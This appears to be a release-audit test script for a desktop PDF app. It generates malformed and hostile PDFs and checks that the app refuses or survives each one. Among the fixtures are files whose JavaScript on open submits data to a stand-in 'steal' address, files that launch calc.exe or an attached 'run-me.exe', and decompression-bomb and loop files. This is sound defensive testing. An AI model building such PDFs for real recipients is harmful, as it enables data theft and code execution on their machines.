// Hostile and damaged PDF corpus through the built app (release audit test 10, October 25).
// Every file is generated here; no real documents. For each file PDFix must, within the time limit:
//   - open it or refuse it with a message (never hang, never crash the window);
//   - never run anything (no new processes besides PDFix's own, no network attempt);
//   - stay usable: Fill and sign opens or refuses cleanly, and a good PDF opens afterwards.
// Usage: node scripts/agent-run.mjs claude --minutes=40 -- node scripts/check-hostile-pdfs.mjs
import {_electron as electron} from '@playwright/test';
import fs from 'node:fs/promises';
import path from 'node:path';
import zlib from 'node:zlib';
import {execFileSync} from 'node:child_process';
import {chooseDocumentMode} from './user-robot/document-mode.mjs';
import {PDFDocument} from 'pdf-lib';

const root = path.resolve('tmp/hostile-pdfs'), files = path.join(root, 'files');
await fs.rm(root, {recursive: true, force: true}); await fs.mkdir(files, {recursive: true});

// Builds a PDF from numbered object bodies with a correct cross-reference table (unless told to break it).
function rawPdf(objects, {root = 1, trailerExtra = '', breakXref = false, header = '%PDF-1.7'} = {}) {
  let out = header + '\n%\xE2\xE3\xCF\xD3\n'; const offsets = [];
  objects.forEach((body, i) => { offsets[i + 1] = Buffer.byteLength(out, 'latin1'); out += `${i + 1} 0 obj\n${body}\nendobj\n`; });
  const xref = Buffer.byteLength(out, 'latin1');
  out += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n` + objects.map((_, i) => String(breakXref ? 999999 + i : offsets[i + 1]).padStart(10, '0') + ' 00000 n \n').join('');
  out += `trailer\n<< /Size ${objects.length + 1} /Root ${root} 0 R ${trailerExtra}>>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(out, 'latin1');
}
const page = (extra = '', contents = 4) => `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents ${contents} 0 R /Resources << /Font << /F1 5 0 R >> >> ${extra}>>`;
const font = '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>';
const text = (s) => { const c = `BT /F1 24 Tf 72 700 Td (${s}) Tj ET`; return `<< /Length ${c.length} >>\nstream\n${c}\nendstream`; };
const flate = (buf, dict = '') => { const z = zlib.deflateSync(buf); return {dict: `<< /Length ${z.length} /Filter /FlateDecode ${dict}>>`, data: z}; };

const good = await (async () => { const d = await PDFDocument.create(); d.addPage([612, 792]).drawText('Good file after the hostile one', {x: 72, y: 700, size: 20}); return Buffer.from(await d.save()); })();
const cases = [];
const add = (name, bytes, about) => cases.push({name, bytes, about});

add('truncated-half.pdf', good.subarray(0, Math.floor(good.length / 2)), 'valid PDF cut in half');
add('broken-xref.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page(), text('Broken xref still readable'), font], {breakXref: true}), 'cross-reference offsets all wrong');
add('page-tree-loop.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [2 0 R 3 0 R] /Count 2 >>', page(), text('Loop'), font]), 'page tree contains itself');
add('reference-loop.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R /Outlines 6 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page(), text('Ref loop'), font, '<< /Type /Outlines /First 7 0 R /Last 7 0 R /Count 1 >>', '<< /Title (A) /Parent 6 0 R /Next 7 0 R /Prev 7 0 R /First 7 0 R >>']), 'bookmark that points to itself forever');
add('huge-page.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page().replace('[0 0 612 792]', '[0 0 1e9 1e9]'), text('Huge page'), font]), 'page 1e9 x 1e9 points');
add('zero-page.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page().replace('[0 0 612 792]', '[0 0 0 -5]'), text('Zero page'), font]), 'page with zero/negative size');
add('million-pages-claimed.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1000000 >>', page(), text('Claims a million pages'), font]), 'page count says 1,000,000');
{ const z = flate(Buffer.alloc(60 * 1024 * 1024, 0x20));
  const body = `${z.dict}\nstream\n${z.data.toString('latin1')}\nendstream`;
  add('flate-bomb.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page(), body, font]), 'content stream that inflates to 60 MB'); }
{ const z = flate(Buffer.alloc(1000, 0));
  const img = `<< /Type /XObject /Subtype /Image /Width 100000 /Height 100000 /BitsPerComponent 8 /ColorSpace /DeviceRGB /Length ${z.data.length} /Filter /FlateDecode >>\nstream\n${z.data.toString('latin1')}\nendstream`;
  const c = 'q 600 0 0 700 0 0 cm /Im0 Do Q';
  add('lying-image.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /XObject << /Im0 5 0 R >> >> >>`, `<< /Length ${c.length} >>\nstream\n${c}\nendstream`, img]), 'image claims 100,000 x 100,000 pixels from 1 KB'); }
add('deep-nesting.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R /Junk ' + '['.repeat(50000) + ']'.repeat(50000) + ' >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page(), text('Deep nesting'), font]), '50,000 nested arrays');
add('javascript-actions.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R /Names << /JavaScript << /Names [(a) 6 0 R] >> >> >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page('/AA << /O 7 0 R >>'), text('Has JavaScript, launch and web actions'), font, '<< /S /JavaScript /JS (app.alert(1); this.submitForm("http://example.invalid/steal");) >>', '<< /S /Launch /F (C:\\\\Windows\\\\System32\\\\calc.exe) /NewWindow true >>']), 'JavaScript on open, launch calc.exe, submit to a web address');
add('uri-on-open.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /URI /URI (http://example.invalid/ping) >> >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page(), text('Web action on open'), font]), 'opens a web address on open');
{ const exe = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(200, 0x90)]);
  const ef = `<< /Type /EmbeddedFile /Length ${exe.length} >>\nstream\n${exe.toString('latin1')}\nendstream`;
  add('attached-exe.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles << /Names [(run-me.exe) 6 0 R] >> >> /OpenAction << /S /Launch /F (run-me.exe) >> >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page(), text('Attached program'), font, '<< /Type /Filespec /F (run-me.exe) /UF (run-me.exe) /EF << /F 7 0 R >> >>', ef]), 'attached .exe with a launch action'); }
{ const garbage = Buffer.alloc(4096, 0xAB); const ff = `<< /Length ${garbage.length} /Length1 ${garbage.length} >>\nstream\n${garbage.toString('latin1')}\nendstream`;
  add('garbage-font.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page(), text('Garbage embedded font'), '<< /Type /Font /Subtype /TrueType /BaseFont /Bad /FirstChar 32 /LastChar 126 /Widths [] /FontDescriptor 6 0 R >>', '<< /Type /FontDescriptor /FontName /Bad /Flags 32 /FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 /FontFile2 7 0 R >>', ff]), 'embedded TrueType font is random bytes'); }
add('broken-encryption.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page(), text('Broken encryption'), font, '<< /Filter /NotARealHandler /V 99 /R 99 /Length 4096 /O (x) /U (y) /P -1 >>'], {trailerExtra: '/Encrypt 6 0 R /ID [<00> <00>] '}), 'encryption dictionary with an unknown method');
{ const annots = []; const objs = ['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', null, text('Five thousand notes'), font];
  for (let i = 0; i < 5000; i++) { annots.push(`${objs.length + 1} 0 R`); objs.push(`<< /Type /Annot /Subtype /Text /Rect [${i % 600} ${i % 780} ${i % 600 + 10} ${i % 780 + 10}] /Contents (note ${i}) >>`); }
  objs[2] = page(`/Annots [${annots.join(' ')}]`);
  add('five-thousand-notes.pdf', rawPdf(objs), '5,000 note annotations on one page'); }
add('xfa-only.pdf', rawPdf(['<< /Type /Catalog /Pages 2 0 R /AcroForm << /XFA 6 0 R /Fields [] >> /NeedsRendering true >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page(), text('Please wait... XFA only'), font, '<< /Length 60 >>\nstream\n<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template/></xdp:xdp>\nendstream']), 'dynamic XFA form only');
add('not-a-pdf-but-named-pdf.pdf', Buffer.from('MZ\x90\x00 this is a Windows program, not a PDF', 'latin1'), 'a program renamed to .pdf');

for (const c of cases) await fs.writeFile(path.join(files, c.name), c.bytes);
const goodFile = path.join(files, 'good-after.pdf'); await fs.writeFile(goodFile, good);

const report = {at: new Date().toISOString(), cases: []};
// HOSTILE_ONLY=<regex> runs only matching files.
const only = process.env.HOSTILE_ONLY ? new RegExp(process.env.HOSTILE_ONLY, 'i') : null;
if (only) cases.splice(0, cases.length, ...cases.filter((c) => only.test(c.name)));
const LIMIT = 45000;
for (const c of cases) {
  const row = {name: c.name, about: c.about, bytes: c.bytes.length};
  const app = await electron.launch({args: ['.'], env: {...process.env, PDFIX_TEST_DATA: path.join(root, 'profile-' + c.name), PDFIX_TEST_VISIBLE: '0'}});
  const page = await app.firstWindow({timeout: 60000});
  const errors = []; page.on('pageerror', (e) => errors.push(e.message.slice(0, 200)));
  const requests = []; page.on('request', (r) => { if (!/^(pdfix|file|data|blob|devtools|chrome-extension):/.test(r.url())) requests.push(r.url().slice(0, 120)); });
  try {
    await app.evaluate(({dialog}, f) => { dialog.showOpenDialog = async () => ({canceled: false, filePaths: [f]}); }, path.join(files, c.name));
    const t0 = Date.now();
    await page.getByRole('button', {name: 'Open a file', exact: true}).first().click();
    const outcome = await Promise.race([
      page.waitForFunction(() => document.querySelector('.document-area .pdf-paper')?.dataset.ready === 'true', null, {timeout: LIMIT}).then(() => 'rendered'),
      page.waitForFunction(() => [...document.querySelectorAll('.toast,[role=alert],.reader-notice,.pdf-notice,.status,[role=status]')].some((e) => /could not|cannot|can't|not a PDF|damaged|unsupported|refus|too large|limit|memory|password|empty|not match|unavailable|circular|unknown encryption/i.test(e.textContent)), null, {timeout: LIMIT}).then(() => 'refused with a message'),
    ]).catch(() => 'NO ANSWER within ' + LIMIT / 1000 + ' s');
    row.open = outcome; row.openSeconds = +((Date.now() - t0) / 1000).toFixed(1);
    row.message = (await page.evaluate(() => [...document.querySelectorAll('.toast,[role=alert],.reader-notice,.pdf-notice')].map((e) => e.textContent.trim()).filter(Boolean).slice(0, 2).join(' / '))).slice(0, 220);
    // Fill and sign on the same file (Claude's tool): opens or refuses, never hangs.
    if (/NO ANSWER/.test(outcome)) await page.screenshot({path: path.join(root, 'no-answer-' + c.name + '.png')}).catch(() => {});
    if (outcome === 'rendered') {
      await chooseDocumentMode(page, 'build').catch(() => {});
      const fill = page.getByRole('button', {name: /^Fill and sign/}).first();
      if (await fill.isVisible().catch(() => false)) {
        await fill.click().catch(() => {});
        row.fillAndSign = await Promise.race([
          page.locator('.form-workspace .form-status').filter({hasText: /fields found|Select a field|could not|cannot|unsupported|refus|damaged|invalid|too many/i}).first().waitFor({timeout: 30000}).then(async () => (await page.locator('.form-workspace .form-status').first().textContent()).trim().slice(0, 120)),
          page.locator('.toast').filter({hasText: /could not|cannot|unsupported|refus/i}).first().waitFor({timeout: 30000}).then(async () => 'refused: ' + (await page.locator('.toast').first().textContent()).trim().slice(0, 120)),
        ]).catch(async () => { await page.screenshot({path: path.join(root, 'no-answer-fill-' + c.name + '.png')}).catch(() => {}); return 'NO ANSWER within 30 s (status: ' + ((await page.locator('.form-workspace .form-status').first().textContent().catch(() => '')) || '').trim().slice(0, 100) + ')'; });
        await page.getByRole('button', {name: 'Close fill and sign'}).click().catch(() => {});
      } else row.fillAndSign = '(tool not visible in this mode)';
    }
    // Still usable: a good PDF opens next.
    await page.getByRole('button', {name: /^(Back|Back to Home)$/}).first().click().catch(() => {});
    await page.getByRole('button', {name: 'Home', exact: true}).first().click().catch(() => {});
    await app.evaluate(({dialog}, f) => { dialog.showOpenDialog = async () => ({canceled: false, filePaths: [f]}); }, goodFile);
    await page.getByRole('button', {name: 'Open a file', exact: true}).first().click();
    row.goodAfter = await page.waitForFunction(() => document.querySelector('.document-area .pdf-paper')?.dataset.ready === 'true', null, {timeout: 60000}).then(() => 'opens').catch(() => 'DID NOT OPEN');
    row.childProcesses = (() => { try { const list = execFileSync('tasklist', ['/fo', 'csv', '/nh'], {encoding: 'utf8'}).toLowerCase(); return ['calc.exe', 'calculatorapp.exe', 'run-me.exe'].filter((n) => list.includes('"' + n + '"')).join(',') || 'none'; } catch { return 'unknown'; } })();
  } catch (e) { row.error = e.message.split('\n')[0].slice(0, 200); }
  row.pageErrors = errors.slice(0, 3); row.networkAttempts = requests.slice(0, 3);
  await app.evaluate(({app}) => app.exit(0)).catch(() => {}); await app.close().catch(() => {});
  report.cases.push(row);
  const bad = /NO ANSWER|DID NOT OPEN/.test(JSON.stringify(row)) || row.error || row.networkAttempts.length || (row.childProcesses && row.childProcesses !== 'none' && row.childProcesses !== 'unknown');
  console.log((bad ? 'PROBLEM ' : 'ok      ') + c.name.padEnd(30) + ` ${row.open} (${row.openSeconds}s)` + (row.fillAndSign ? ' | fill and sign: ' + row.fillAndSign.slice(0, 60) : '') + ` | good after: ${row.goodAfter}` + (row.error ? ' | ERROR ' + row.error : '') + (row.networkAttempts.length ? ' | NETWORK ' + row.networkAttempts.join(',') : ''));
}
await fs.writeFile(path.join(root, 'report.json'), JSON.stringify(report, null, 1));
